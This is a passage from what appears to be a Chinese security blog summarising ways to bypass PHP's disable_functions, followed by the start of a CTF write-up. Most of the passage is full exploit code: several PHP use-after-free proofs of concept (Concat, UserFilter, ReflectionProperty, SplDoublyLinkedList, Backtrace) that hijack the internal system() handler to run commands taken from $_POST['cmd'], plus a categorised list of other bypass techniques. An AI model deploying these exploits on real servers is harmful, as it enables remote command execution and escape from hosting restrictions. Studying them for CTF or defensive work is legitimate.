$binary_leak & 0xfffffffffffff000;\n        for($i = 0; $i < 0x1000; $i++) {\n            $addr = $start - 0x1000 * $i;\n            $leak = leak($addr, 0, 7);\n            if($leak == 0x10102464c457f) { # ELF header\n                return $addr;\n            }\n        }\n    }\n\n    function get_system($basic_funcs) {\n        $addr = $basic_funcs;\n        do {\n            $f_entry = leak($addr);\n            $f_name = leak($f_entry, 0, 6);\n\n            if($f_name == 0x6d6574737973) { # system\n                return leak($addr + 8);\n            }\n            $addr += 0x20;\n        } while($f_entry != 0);\n        return false;\n    }\n\n    function trigger_uaf($arg) {\n        # str_shuffle prevents opcache string interning\n        $arg = str_shuffle(str_repeat('A', 79));\n        $vuln = new Vuln();\n        $vuln->a = $arg;\n    }\n\n    if(stristr(PHP_OS, 'WIN')) {\n        die('This PoC is for *nix systems only.');\n    }\n\n    $n_alloc = 10; # increase this value if UAF fails\n    $contiguous = [];\n    for($i = 0; $i < $n_alloc; $i++)\n        $contiguous[] = str_shuffle(str_repeat('A', 79));\n\n    trigger_uaf('x');\n    $abc = $backtrace[1]['args'][0];\n\n    $helper = new Helper;\n    $helper->b = function ($x) { };\n\n    if(strlen($abc) == 79 || strlen($abc) == 0) {\n        die(\"UAF failed\");\n    }\n\n    # leaks\n    $closure_handlers = str2ptr($abc, 0);\n    $php_heap = str2ptr($abc, 0x58);\n    $abc_addr = $php_heap - 0xc8;\n\n    # fake value\n    write($abc, 0x60, 2);\n    write($abc, 0x70, 6);\n\n    # fake reference\n    write($abc, 0x10, $abc_addr + 0x60);\n    write($abc, 0x18, 0xa);\n\n    $closure_obj = str2ptr($abc, 0x20);\n\n    $binary_leak = leak($closure_handlers, 8);\n    if(!($base = get_binary_base($binary_leak))) {\n        die(\"Couldn't determine binary base address\");\n    }\n\n    if(!($elf = parse_elf($base))) {\n        die(\"Couldn't parse ELF header\");\n    }\n\n    if(!($basic_funcs = get_basic_funcs($base, $elf))) {\n        die(\"Couldn't get basic_functions address\");\n    }\n\n    if(!($zif_system = get_system($basic_funcs))) {\n        die(\"Couldn't get zif_system address\");\n    }\n\n    # fake closure object\n    $fake_obj_offset = 0xd0;\n    for($i = 0; $i < 0x110; $i += 8) {\n        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));\n    }\n\n    # pwn\n    write($abc, 0x20, $abc_addr + $fake_obj_offset);\n    write($abc, 0xd0 + 0x38, 1, 4); # internal func type\n    write($abc, 0xd0 + 0x68, $zif_system); # internal func handler\n\n    ($helper->b)($cmd);\n    exit();\n}\n```\n\n\n\n## php_Concat_UAF（PHP 7.3-8.1）\n\n\n**利用条件**\n\n- Linux 操作系统\n- PHP7.3 - all versions to date\n- PHP7.4 - all versions to date\n- PHP8.0 - all versions to date\n- PHP8.1 - all versions to date\n\n**原理**\n\n此漏洞利用了处理字符串连接的函数中的错误。如果满足某些条件，诸如 $a.$b 之类的语句可能会导致内存损坏。错误报告提供了对该漏洞的非常详尽的分析\n\n[type confusion/UAF on set_error_handler with concat operation](https://bugs.php.net/bug.php?id=81705)\n\n**exp**\n\n```php\n<?php\n\n# PHP 7.3-8.1 disable_functions bypass PoC (*nix only)\n#\n# Bug: https://bugs.php.net/bug.php?id=81705\n#\n# This exploit should work on all PHP 7.3-8.1 versions\n# released as of 2022-01-07\n#\n# Author: https://github.com/mm0r1\n\n//new Pwn(\"uname -a\");\nnew Pwn($_POST['cmd']);\n\nclass Helper { public $a, $b, $c; }\nclass Pwn {\n    const LOGGING = false;\n    const CHUNK_DATA_SIZE = 0x60;\n    const CHUNK_SIZE = ZEND_DEBUG_BUILD ? self::CHUNK_DATA_SIZE + 0x20 : self::CHUNK_DATA_SIZE;\n    const STRING_SIZE = self::CHUNK_DATA_SIZE - 0x18 - 1;\n\n    const HT_SIZE = 0x118;\n    const HT_STRING_SIZE = self::HT_SIZE - 0x18 - 1;\n\n    public function __construct($cmd) {\n        for($i = 0; $i < 10; $i++) {\n            $groom[] = self::alloc(self::STRING_SIZE);\n            $groom[] = self::alloc(self::HT_STRING_SIZE);\n        }\n        \n        $concat_str_addr = self::str2ptr($this->heap_leak(), 16);\n        $fill = self::alloc(self::STRING_SIZE);\n\n        $this->abc = self::alloc(self::STRING_SIZE);\n        $abc_addr = $concat_str_addr + self::CHUNK_SIZE;\n        self::log(\"abc @ 0x%x\", $abc_addr);\n\n        $this->free($abc_addr);\n        $this->helper = new Helper;\n        if(strlen($this->abc) < 0x1337) {\n            self::log(\"uaf failed\");\n            return;\n        }\n\n        $this->helper->a = \"leet\";\n        $this->helper->b = function($x) {};\n        $this->helper->c = 0xfeedface;\n\n        $helper_handlers = $this->rel_read(0);\n        self::log(\"helper handlers @ 0x%x\", $helper_handlers);\n\n        $closure_addr = $this->rel_read(0x20);\n        self::log(\"real closure @ 0x%x\", $closure_addr);\n\n        $closure_ce = $this->read($closure_addr + 0x10);\n        self::log(\"closure class_entry @ 0x%x\", $closure_ce);\n        \n        $basic_funcs = $this->get_basic_funcs($closure_ce);\n        self::log(\"basic_functions @ 0x%x\", $basic_funcs);\n\n        $zif_system = $this->get_system($basic_funcs);\n        self::log(\"zif_system @ 0x%x\", $zif_system);\n\n        $fake_closure_off = 0x70;\n        for($i = 0; $i < 0x138; $i += 8) {\n            $this->rel_write($fake_closure_off + $i, $this->read($closure_addr + $i));\n        }\n        $this->rel_write($fake_closure_off + 0x38, 1, 4);\n        $handler_offset = PHP_MAJOR_VERSION === 8 ? 0x70 : 0x68;\n        $this->rel_write($fake_closure_off + $handler_offset, $zif_system);\n\n        $fake_closure_addr = $abc_addr + $fake_closure_off + 0x18;\n        self::log(\"fake closure @ 0x%x\", $fake_closure_addr);\n\n        $this->rel_write(0x20, $fake_closure_addr);\n        ($this->helper->b)($cmd);\n\n        $this->rel_write(0x20, $closure_addr);\n        unset($this->helper->b);\n    }\n\n    private function heap_leak() {\n        $arr = [[], []];\n        set_error_handler(function() use (&$arr, &$buf) {\n            $arr = 1;\n            $buf = str_repeat(\"\\x00\", self::HT_STRING_SIZE);\n        });\n        $arr[1] .= self::alloc(self::STRING_SIZE - strlen(\"Array\"));\n        return $buf;\n    }\n\n    private function free($addr) {\n        $payload = pack(\"Q*\", 0xdeadbeef, 0xcafebabe, $addr);\n        $payload .= str_repeat(\"A\", self::HT_STRING_SIZE - strlen($payload));\n        \n        $arr = [[], []];\n        set_error_handler(function() use (&$arr, &$buf, &$payload) {\n            $arr = 1;\n            $buf = str_repeat($payload, 1);\n        });\n        $arr[1] .= \"x\";\n    }\n\n    private function rel_read($offset) {\n        return self::str2ptr($this->abc, $offset);\n    }\n\n    private function rel_write($offset, $value, $n = 8) {\n        for ($i = 0; $i < $n; $i++) {\n            $this->abc[$offset + $i] = chr($value & 0xff);\n            $value >>= 8;\n        }\n    }\n\n    private function read($addr, $n = 8) {\n        $this->rel_write(0x10, $addr - 0x10);\n        $value = strlen($this->helper->a);\n        if($n !== 8) { $value &= (1 << ($n << 3)) - 1; }\n        return $value;\n    }\n\n    private function get_system($basic_funcs) {\n        $addr = $basic_funcs;\n        do {\n            $f_entry = $this->read($addr);\n            $f_name = $this->read($f_entry, 6);\n            if($f_name === 0x6d6574737973) {\n                return $this->read($addr + 8);\n            }\n            $addr += 0x20;\n        } while($f_entry !== 0);\n    }\n\n    private function get_basic_funcs($addr) {\n        while(true) {\n            // In rare instances the standard module might lie after the addr we're starting\n            // the search from. This will result in a SIGSGV when the search reaches an unmapped page.\n            // In that case, changing the direction of the search should fix the crash.\n            // $addr += 0x10;\n            $addr -= 0x10;\n            if($this->read($addr, 4) === 0xA8 &&\n                in_array($this->read($addr + 4, 4),\n                    [20180731, 20190902, 20200930, 20210902])) {\n                $module_name_addr = $this->read($addr + 0x20);\n                $module_name = $this->read($module_name_addr);\n                if($module_name === 0x647261646e617473) {\n                    self::log(\"standard module @ 0x%x\", $addr);\n                    return $this->read($addr + 0x28);\n                }\n            }\n        }\n    }\n\n    private function log($format, $val = \"\") {\n        if(self::LOGGING) {\n            printf(\"{$format}\\n\", $val);\n        }\n    }\n\n    static function alloc($size) {\n        return str_shuffle(str_repeat(\"A\", $size));\n    }\n\n    static function str2ptr($str, $p = 0, $n = 8) {\n        $address = 0;\n        for($j = $n - 1; $j >= 0; $j--) {\n            $address <<= 8;\n            $address |= ord($str[$p + $j]);\n        }\n        return $address;\n    }\n}\n\n?>\n```\n\n\n\n\n## php7_UserFilter（PHP 7.0-8.0）\n\n\n**利用条件**\n\n- php5.* - exploitable with minor changes to the PoC\n- php7.0 - all versions to date\n- php7.1 - all versions to date\n- php7.2 - all versions to date\n- php7.3 - all versions to date\n- php7.4 < 7.4.26\n- php8.0 < 8.0.13\n\n**原理**\n\n[Memory corruption with user_filter](https://bugs.php.net/bug.php?id=54350)\n\n**exp**\n\n```php\n<?php\n# PHP 7.0-8.0 disable_functions bypass PoC (*nix only)\n#\n# Bug: https://bugs.php.net/bug.php?id=54350\n#\n# This exploit should work on all PHP 7.0-8.0 versions\n# released as of 2021-10-06\n#\n# Author: https://github.com/mm0r1\n\n//pwn('uname -a');\npwn($_POST['cmd']);\n\nfunction pwn($cmd) {\n    define('LOGGING', false);\n    define('CHUNK_DATA_SIZE', 0x60);\n    define('CHUNK_SIZE', ZEND_DEBUG_BUILD ? CHUNK_DATA_SIZE + 0x20 : CHUNK_DATA_SIZE);\n    define('FILTER_SIZE', ZEND_DEBUG_BUILD ? 0x70 : 0x50);\n    define('STRING_SIZE', CHUNK_DATA_SIZE - 0x18 - 1);\n    define('CMD', $cmd);\n    for($i = 0; $i < 10; $i++) {\n        $groom[] = Pwn::alloc(STRING_SIZE);\n    }\n    stream_filter_register('pwn_filter', 'Pwn');\n    $fd = fopen('php://memory', 'w');\n    stream_filter_append($fd,'pwn_filter');\n    fwrite($fd, 'x');\n}\n\nclass Helper { public $a, $b, $c; }\nclass Pwn extends php_user_filter {\n    private $abc, $abc_addr;\n    private $helper, $helper_addr, $helper_off;\n    private $uafp, $hfp;\n\n    public function filter($in, $out, &$consumed, $closing) {\n        if($closing) return;\n        stream_bucket_make_writeable($in);\n        $this->filtername = Pwn::alloc(STRING_SIZE);\n        fclose($this->stream);\n        $this->go();\n        return PSFS_PASS_ON;\n    }\n\n    private function go() {\n        $this->abc = &$this->filtername;\n\n        $this->make_uaf_obj();\n\n        $this->helper = new Helper;\n        $this->helper->b = function($x) {};\n\n        $this->helper_addr = $this->str2ptr(CHUNK_SIZE * 2 - 0x18) - CHUNK_SIZE * 2;\n        $this->log(\"helper @ 0x%x\", $this->helper_addr);\n\n        $this->abc_addr = $this->helper_addr - CHUNK_SIZE;\n        $this->log(\"abc @ 0x%x\", $this->abc_addr);\n\n        $this->helper_off = $this->helper_addr - $this->abc_addr - 0x18;\n\n        $helper_handlers = $this->str2ptr(CHUNK_SIZE);\n        $this->log(\"helper handlers @ 0x%x\", $helper_handlers);\n\n        $this->prepare_leaker();\n\n        $binary_leak = $this->read($helper_handlers + 8);\n        $this->log(\"binary leak @ 0x%x\", $binary_leak);\n        $this->prepare_cleanup($binary_leak);\n\n        $closure_addr = $this->str2ptr($this->helper_off + 0x38);\n        $this->log(\"real closure @ 0x%x\", $closure_addr);\n\n        $closure_ce = $this->read($closure_addr + 0x10);\n        $this->log(\"closure class_entry @ 0x%x\", $closure_ce);\n\n        $basic_funcs = $this->get_basic_funcs($closure_ce);\n        $this->log(\"basic_functions @ 0x%x\", $basic_funcs);\n\n        $zif_system = $this->get_system($basic_funcs);\n        $this->log(\"zif_system @ 0x%x\", $zif_system);\n\n        $fake_closure_off = $this->helper_off + CHUNK_SIZE * 2;\n        for($i = 0; $i < 0x138; $i += 8) {\n            $this->write($fake_closure_off + $i, $this->read($closure_addr + $i));\n        }\n        $this->write($fake_closure_off + 0x38, 1, 4);\n\n        $handler_offset = PHP_MAJOR_VERSION === 8 ? 0x70 : 0x68;\n        $this->write($fake_closure_off + $handler_offset, $zif_system);\n\n        $fake_closure_addr = $this->helper_addr + $fake_closure_off - $this->helper_off;\n        $this->write($this->helper_off + 0x38, $fake_closure_addr);\n        $this->log(\"fake closure @ 0x%x\", $fake_closure_addr);\n\n        $this->cleanup();\n        ($this->helper->b)(CMD);\n    }\n\n    private function make_uaf_obj() {\n        $this->uafp = fopen('php://memory', 'w');\n        fwrite($this->uafp, pack('QQQ', 1, 0, 0xDEADBAADC0DE));\n        for($i = 0; $i < STRING_SIZE; $i++) {\n            fwrite($this->uafp, \"\\x00\");\n        }\n    }\n\n    private function prepare_leaker() {\n        $str_off = $this->helper_off + CHUNK_SIZE + 8;\n        $this->write($str_off, 2);\n        $this->write($str_off + 0x10, 6);\n\n        $val_off = $this->helper_off + 0x48;\n        $this->write($val_off, $this->helper_addr + CHUNK_SIZE + 8);\n        $this->write($val_off + 8, 0xA);\n    }\n\n    private function prepare_cleanup($binary_leak) {\n        $ret_gadget = $binary_leak;\n        do {\n            --$ret_gadget;\n        } while($this->read($ret_gadget, 1) !== 0xC3);\n        $this->log(\"ret gadget = 0x%x\", $ret_gadget);\n        $this->write(0, $this->abc_addr + 0x20 - (PHP_MAJOR_VERSION === 8 ? 0x50 : 0x60));\n        $this->write(8, $ret_gadget);\n    }\n\n    private function read($addr, $n = 8) {\n        $this->write($this->helper_off + CHUNK_SIZE + 16, $addr - 0x10);\n        $value = strlen($this->helper->c);\n        if($n !== 8) { $value &= (1 << ($n << 3)) - 1; }\n        return $value;\n    }\n\n    private function write($p, $v, $n = 8) {\n        for($i = 0; $i < $n; $i++) {\n            $this->abc[$p + $i] = chr($v & 0xff);\n            $v >>= 8;\n        }\n    }\n\n    private function get_basic_funcs($addr) {\n        while(true) {\n            // In rare instances the standard module might lie after the addr we're starting\n            // the search from. This will result in a SIGSGV when the search reaches an unmapped page.\n            // In that case, changing the direction of the search should fix the crash.\n            // $addr += 0x10;\n            $addr -= 0x10;\n            if($this->read($addr, 4) === 0xA8 &&\n                in_array($this->read($addr + 4, 4),\n                    [20151012, 20160303, 20170718, 20180731, 20190902, 20200930])) {\n                $module_name_addr = $this->read($addr + 0x20);\n                $module_name = $this->read($module_name_addr);\n                if($module_name === 0x647261646e617473) {\n                    $this->log(\"standard module @ 0x%x\", $addr);\n                    return $this->read($addr + 0x28);\n                }\n            }\n        }\n    }\n\n    private function get_system($basic_funcs) {\n        $addr = $basic_funcs;\n        do {\n            $f_entry = $this->read($addr);\n            $f_name = $this->read($f_entry, 6);\n            if($f_name === 0x6d6574737973) {\n                return $this->read($addr + 8);\n            }\n            $addr += 0x20;\n        } while($f_entry !== 0);\n    }\n\n    private function cleanup() {\n        $this->hfp = fopen('php://memory', 'w');\n        fwrite($this->hfp, pack('QQ', 0, $this->abc_addr));\n        for($i = 0; $i < FILTER_SIZE - 0x10; $i++) {\n            fwrite($this->hfp, \"\\x00\");\n        }\n    }\n\n    private function str2ptr($p = 0, $n = 8) {\n        $address = 0;\n        for($j = $n - 1; $j >= 0; $j--) {\n            $address <<= 8;\n            $address |= ord($this->abc[$p + $j]);\n        }\n        return $address;\n    }\n\n    private function ptr2str($ptr, $n = 8) {\n        $out = '';\n        for ($i = 0; $i < $n; $i++) {\n            $out .= chr($ptr & 0xff);\n            $ptr >>= 8;\n        }\n        return $out;\n    }\n\n    private function log($format, $val = '') {\n        if(LOGGING) {\n            printf(\"{$format}\\n\", $val);\n        }\n    }\n\n    static function alloc($size) {\n        return str_shuffle(str_repeat('A', $size));\n    }\n}\n?>\n```\n\n\n\n\n\n\n\n## php7_ReflectionProperty_UAF\n\n\n**利用条件**\n\n- 7.4.x 版本上进行利用，最高可利用版本为 7.4.8。\n\n\n**原理**\n\n[Use after free when type duplicated into ReflectionProperty gets resolved](https://bugs.php.net/bug.php?id=79820)\n\n**exp**\n\n最简触发脚本\n\n```php\n<?php\nclass Test {\npublic stdClass $prop;\n}\n$rp = new ReflectionProperty(Test::class, 'prop');\n$test = new Test;\n$test->prop = new stdClass;\nvar_dump($rp->getType()->getName());\n```\n\nrce\n\n```php\n<?php\nglobal $abc, $helper;\nclass Test {\n    public HelperHelperHelperHelperHelperHelperHelper $prop;\n}\nclass HelperHelperHelperHelperHelperHelperHelper {\n    public $a, $b;\n}\nfunction s2n($str) {\n    $address = 0;\n    for ($i=0;$i<4;$i++) {\n        $address <<= 8;\n        $address |= ord($str[4 + $i]);\n    }\n    return $address;\n}\nfunction s2b($str, $offset) {\n    return hex2bin(str_pad(dechex(s2n($str) + $offset - 0x10), 8, \"0\",\n        STR_PAD_LEFT));\n}\nfunction leak($offset) {\n    global $abc;\n    $data = \"\";\n    for ($i = 0;$i < 8;$i++) {\n        $data .= $abc[$offset + 7 - $i];\n    }\n    return $data;\n}\nfunction leak2($address) {\n    global $helper;\n    write(0x20, $address);\n    $leak = strlen($helper -> b);\n    $leak = dechex($leak);\n    $leak = str_pad($leak, 16, \"0\", STR_PAD_LEFT);\n    $leak = hex2bin($leak);\n    return $leak;\n}\nfunction write($offset, $data) {\n    global $abc;\n    $data = str_pad($data, 8, \"\\x00\", STR_PAD_LEFT);\n    for ($i = 0;$i < 8;$i++) {\n        $abc[$offset + $i] = $data[7 - $i];\n    }\n}\nfunction get_basic_funcs($std_object_handlers) {\n    $prefix = substr($std_object_handlers, 0, 4);\n    $std_object_handlers = hexdec(bin2hex($std_object_handlers));\n    $start = $std_object_handlers & 0x00000000fffff000 | 0x0000000000000920;\n    # change 0x920 if finding failed\n\t$NumPrefix = $std_object_handlers & 0x0000ffffff000000;\n\t$NumPrefix = $NumPrefix - 0x0000000001000000;\n\t$funcs = get_defined_functions()['internal'];\n\tfor ($i = 0; $i < 0x1000; $i++) {\n        $addr = $start - 0x1000 * $i;\n        $name_addr = bin2hex(leak2($prefix . hex2bin(str_pad(dechex($addr - 0x10), 8,\n                \"0\", STR_PAD_LEFT))));\n        if (hexdec($name_addr) > $std_object_handlers || hexdec($name_addr) < $NumPrefix) {\n            continue;\n        }\n        $name_addr = str_pad($name_addr, 16, \"0\", STR_PAD_LEFT);\n        $name = strrev(leak2($prefix . s2b(hex2bin($name_addr), 0x00)));\n        $name = explode(\"\\x00\", $name)[0];\n        if(in_array($name, $funcs)) {\n            return [$name, bin2hex($prefix) . str_pad(dechex($addr), 8, \"0\", STR_PAD_LEFT),\n                $std_object_handlers, $NumPrefix];\n        }\n    }\n}\nfunction getSystem($unknown_func) {\n    $unknown_addr = hex2bin($unknown_func[1]);\n    $prefix = substr($unknown_addr, 0, 4);\n    $unknown_addr = hexdec($unknown_func[1]);\n    $start = $unknown_addr & 0x00000000ffffffff;\n    for ($i = 0;$i < 0x800;$i++) {\n        $addr = $start - 0x20 * $i;\n        $name_addr = bin2hex(leak2($prefix . hex2bin(str_pad(dechex($addr - 0x10), 8,\n                \"0\", STR_PAD_LEFT))));\n        if (hexdec($name_addr) > $unknown_func[2] || hexdec($name_addr) <\n            $unknown_func[3]) {\n            continue;\n        }\n        $name_addr = str_pad($name_addr, 16, \"0\", STR_PAD_LEFT);\n        $name = strrev(leak2($prefix . s2b(hex2bin($name_addr), 0x00)));\n        if(strstr($name, \"system\")) {\n            return bin2hex(leak2($prefix . hex2bin(str_pad(dechex($addr - 0x10 + 0x08), 8,\n                    \"0\", STR_PAD_LEFT))));\n        }\n    }\n    for ($i = 0;$i < 0x800;$i++) {\n        $addr = $start + 0x20 * $i;\n        $name_addr = bin2hex(leak2($prefix . hex2bin(str_pad(dechex($addr - 0x10), 8,\n                \"0\", STR_PAD_LEFT))));\n        if (hexdec($name_addr) > $unknown_func[2] || hexdec($name_addr) <\n            $unknown_func[3]) {\n            continue;\n        }\n        $name_addr = str_pad($name_addr, 16, \"0\", STR_PAD_LEFT);\n        $name = strrev(leak2($prefix . s2b(hex2bin($name_addr), 0x00)));\n        if(strstr($name, \"system\")) {\n            return bin2hex(leak2($prefix . hex2bin(str_pad(dechex($addr - 0x10 + 0x08), 8,\n                    \"0\", STR_PAD_LEFT))));\n        }\n    }\n}\n$rp = new ReflectionProperty(Test::class, 'prop');\n$test = new Test;\n$test -> prop = new HelperHelperHelperHelperHelperHelperHelper;\n$abc = $rp -> getType() -> getName();\n$helper = new HelperHelperHelperHelperHelperHelperHelper();\nif (strlen($abc) < 1000) {\n    exit(\"UAF Failed!\");\n}\n$helper -> a = $helper;\n$php_heap = leak(0x10);\n$helper -> a = function($x) {};\n$std_object_handlers = leak(0x0);\n$prefix = substr($php_heap, 0, 4);\necho \"Helper Object Address: \" . bin2hex($php_heap) . \"\\n\";\necho \"std_object_handlers Address: \" . bin2hex($std_object_handlers) . \"\\n\";\n$closure_object = leak(0x10);\necho \"Closure Object: \" . bin2hex($closure_object) . \"\\n\";\nwrite(0x28, \"\\x06\");\nif(!($unknown_func = get_basic_funcs($std_object_handlers))) {\n    die(\"Couldn't determine funcs address\");\n}\necho \"Find func's adress: \" . $unknown_func[1] . \" -> \" . $unknown_func[0] .\n    \"\\n\";\nif(!($system_address = getSystem($unknown_func))) {\n    die(\"Couldn't determine system address\");\n}\necho \"Find system's handler: \" . $system_address . \"\\n\";\nfor ($i = 0;$i < (0x130 / 0x08);$i++) {\n    write(0x308 + 0x08 * ($i + 1), leak2($prefix . s2b($closure_object, 0x08 *\n            $i)));\n}\n$abc[0x308 + 0x40] = \"\\x01\";\nwrite(0x308 + 0x70, hex2bin($system_address));\nwrite(0x10, $prefix . hex2bin(dechex(s2n($php_heap) + 0x18 + 0x308 + 0x08)));\necho \"Fake Closure Object Address: \" . bin2hex($prefix .\n        hex2bin(str_pad(dechex(s2n($php_heap) + 0x18 + 0x308 + 0x08), 8, \"0\",\n            STR_PAD_LEFT))) . \"\\n\";\n($helper -> a)(\"id\");\n```\n\n\n\n## php7_SplDoublyLinkedList UAF\n\n\n**利用条件**\n\n- PHP v7.4.10及其之前版本\n- PHP v8.0（Alpha）\n\n>如果限制了 openbase_dir ，则需要进行爆破，而且爆破还会导致进程崩溃\n\n\n**原理**\n\nPHP的SplDoublyLinkedList双向链表库中存在一个用后释放漏洞，该漏洞将允许攻击者通过运行PHP代码来转义disable_functions限制函数。在该漏洞的帮助下，远程攻击者将能够实现PHP沙箱逃逸，并执行任意代码。更准确地来说，成功利用该漏洞后，攻击者将能够绕过PHP的某些限制，例如disable_functions和safe_mode等等\n\n[通过UAF bypass PHP disabled functions](https://xz.aliyun.com/t/8355)\n[PHP SplDoublyLinkedList中的用后释放漏洞分析](https://www.freebuf.com/articles/web/251017.html)\n[PHP SplDoublyLinkedList::offsetUnset UAF Sandbox Escape](https://bugs.php.net/bug.php?id=80111)\n\n**exp**\n\n```php\n<?php\nerror_reporting(0);\n$a = str_repeat(\"T\", 120 * 1024 * 1024);\nfunction i2s(&$a, $p, $i, $x = 8) {\n    for($j = 0;$j < $x;$j++) {\n        $a[$p + $j] = chr($i & 0xff);\n        $i >>= 8;\n    }\n}\n\nfunction s2i($s) {\n    $result = 0;\n    for ($x = 0;$x < strlen($s);$x++) {\n        $result <<= 8;\n        $result |= ord($s[$x]);\n    }\n    return $result;\n}\n\nfunction leak(&$a, $address) {\n    global $s;\n    i2s($a, 0x00, $address - 0x10);\n    return strlen($s -> current());\n}\n\nfunction getPHPChunk($maps) {\n    $pattern = '/([0-9a-f]+\\-[0-9a-f]+) rw\\-p 00000000 00:00 0 /';\n    preg_match_all($pattern, $maps, $match);\n    foreach ($match[1] as $value) {\n        list($start, $end) = explode(\"-\", $value);\n        if (($length = s2i(hex2bin($end)) - s2i(hex2bin($start))) >= 0x200000 && $length <= 0x300000) {\n            $address = array(s2i(hex2bin($start)), s2i(hex2bin($end)), $length);\n            echo \"[+]PHP Chunk: \" . $start . \" - \" . $end . \", length: 0x\" . dechex($length) . \"\\n\";\n            return $address;\n        }\n    }\n}\n\nfunction bomb1(&$a) {\n    if (leak($a, s2i($_GET[\"test1\"])) === 0x5454545454545454) {\n        return (s2i($_GET[\"test1\"]) & 0x7ffff0000000);\n    }else {\n        die(\"[!]Where is here\");\n    }\n}\n\nfunction bomb2(&$a) {\n    $start = s2i($_GET[\"test2\"]);\n    return getElement($a, array($start, $start + 0x200000, 0x200000));\n    die(\"[!]Not Found\");\n}\n\nfunction getElement(&$a, $address) {\n    for ($x = 0;$x < ($address[2] / 0x1000 - 2);$x++) {\n        $addr = 0x108 + $address[0] + 0x1000 * $x + 0x1000;\n        for ($y = 0;$y < 5;$y++) {\n            if (leak($a, $addr + $y * 0x08) === 0x1234567812345678 && ((leak($a, $addr + $y * 0x08 - 0x08) & 0xffffffff) === 0x01)){\n                echo \"[+]SplDoublyLinkedList Element: \" . dechex($addr + $y * 0x08 - 0x18) . \"\\n\";\n                return $addr + $y * 0x08 - 0x18;\n            }\n        }\n    }\n}\n\nfunction getClosureChunk(&$a, $address) {\n    do {\n        $address = leak($a, $address);\n    }while(leak($a, $address) !== 0x00);\n    echo \"[+]Closure Chunk: \" . dechex($address) . \"\\n\";\n    return $address;\n}\n\nfunction getSystem(&$a, $address) {\n    $start = $address & 0xffffffffffff0000;\n    $lowestAddr = ($address & 0x0000fffffff00000) - 0x0000000001000000;\n    for($i = 0; $i < 0x1000 * 0x80; $i++) {\n        $addr = $start - $i * 0x20;\n        if ($addr < $lowestAddr) {\n            break;\n        }\n        $nameAddr = leak($a, $addr);\n        if ($nameAddr > $address || $nameAddr < $lowestAddr) {\n            continue;\n        }\n        $name = dechex(leak($a, $nameAddr));\n        $name = str_pad($name, 16, \"0\", STR_PAD_LEFT);\n        $name = strrev(hex2bin($name));\n        $name = explode(\"\\x00\", $name)[0];\n        if($name === \"system\") {\n            return leak($a, $addr + 0x08);\n        }\n    }\n}\n\nclass Trigger {\n    function __destruct() {\n        global $s;\n        unset($s[0]);\n        $a = str_shuffle(str_repeat(\"T\", 0xf));\n        i2s($a, 0x00, 0x1234567812345678);\n        i2s($a, 0x08, 0x04, 7);\n        $s -> current();\n        $s -> next();\n        if ($s -> current() !== 0x1234567812345678) {\n             die(\"[!]UAF Failed\");\n        }\n        $maps = file_get_contents(\"/proc/self/maps\");\n        if (!$maps) {\n            cantRead($a);\n        }else {\n            canRead($maps, $a);\n        }\n        echo \"[+]Done\";\n    }\n}\n\nfunction bypass($elementAddress, &$a) {\n    global $s;\n    if (!$closureChunkAddress = getClosureChunk($a, $elementAddress)) {\n        die(\"[!]Get Closure Chunk Address Failed\");\n    }\n    $closure_object = leak($a, $closureChunkAddress + 0x18);\n    echo \"[+]Closure Object: \" . dechex($closure_object) . \"\\n\";\n    $closure_handlers = leak($a, $closure_object + 0x18);\n    echo \"[+]Closure Handler: \" . dechex($closure_handlers) . \"\\n\";\n    if(!($system_address = getSystem($a, $closure_handlers))) {\n        die(\"[!]Couldn't determine system address\");\n    }\n    echo \"[+]Find system's handler: \" . dechex($system_address) . \"\\n\";\n    i2s($a, 0x08, 0x506, 7);\n    for ($i = 0;$i < (0x130 / 0x08);$i++) {\n        $data = leak($a, $closure_object + 0x08 * $i);\n        i2s($a, 0x00, $closure_object + 0x30);\n        i2s($s -> current(), 0x08 * $i + 0x100, $data);\n    }\n    i2s($a, 0x00, $closure_object + 0x30);\n    i2s($s -> current(), 0x20, $system_address);\n    i2s($a, 0x00, $closure_object);\n    i2s($a, 0x08, 0x108, 7);\n    echo \"[+]Executing command: \\n\";\n    ($s -> current())(\"php -v\");\n}\n\nfunction canRead($maps, &$a) {\n    global $s;\n    if (!$chunkAddress = getPHPChunk($maps)) {\n        die(\"[!]Get PHP Chunk Address Failed\");\n    }\n    i2s($a, 0x08, 0x06, 7);\n    if (!$elementAddress = getElement($a, $chunkAddress)) {\n        die(\"[!]Get SplDoublyLinkedList Element Address Failed\");\n    }\n    bypass($elementAddress, $a);\n}\n\nfunction cantRead(&$a) {\n    global $s;\n    i2s($a, 0x08, 0x06, 7);\n    if (!isset($_GET[\"test1\"]) && !isset($_GET[\"test2\"])) {\n        die(\"[!]Please try to get address of PHP Chunk\");\n    }\n    if (isset($_GET[\"test1\"])) {\n        die(dechex(bomb1($a)));\n    }\n    if (isset($_GET[\"test2\"])) {\n        $elementAddress = bomb2($a);\n    }\n    if (!$elementAddress) {\n        die(\"[!]Get SplDoublyLinkedList Element Address Failed\");\n    }\n    bypass($elementAddress, $a);\n}\n\n$s = new SplDoublyLinkedList();\n$s -> push(new Trigger());\n$s -> push(\"Twings\");\n$s -> push(function($x){});\nfor ($x = 0;$x < 0x100;$x++) {\n    $s -> push(0x1234567812345678);\n}\n$s -> rewind();\nunset($s[0]);\n```\n\n包含该php即可执行命令(141行)\n\n\n\n\n\n\n\n# 总结\n\n>大部分绕过方法在蚁剑中都有插件可以自动利用\n\n绕过disable_functions的方法大致可以分为以下几类\n\n1：寻找未禁用的函数\n\n2：攻击后端组件：Apache_mod_cgi；ImageMagick；Bash Shellshock；\n\n3：利用php的扩展：制作恶意php扩展；php74_FFI；windows com；imap_open()；\n\n4：利用环境变量或者so文件：LD_PRELOAD；php-fpm；iconv；\n\n5：pwn：写shellcode劫持got表；php7_GC_UAF；JSON_Serializer_UAF；php7_Backtrace_UAF；php_Concat_UAF；php7_UserFilter；php7_ReflectionProperty_UAF；php7_SplDoublyLinkedList UAF；\n\n\n","tags":["总结","php","bypass","disable_functions","pwn"],"categories":["总结"]},{"title":"第十七届全国大学生信息安全竞赛-华东南分区赛","url":"/posts/deeac2cd/","content":"\n1签到+4web+4pwn\n\n# web-welcome\n\n签到，Ctrl+U\n\n![](/img/wp/2024/2024ciscn-welcome_1.png)\n\n\n\n\n# web-submit\n\n## break\n\n文件上传，有对内容检测，使用短标签绕过\n\n\n![](/img/wp/2024/2024ciscn-submit-BREAK_1.png)\n\n\n![](/img/wp/2024/2024ciscn-submit-BREAK_2.png)\n\n\n## fix\n\n添加黑名单\n\n```php\n<?php\n// $path = 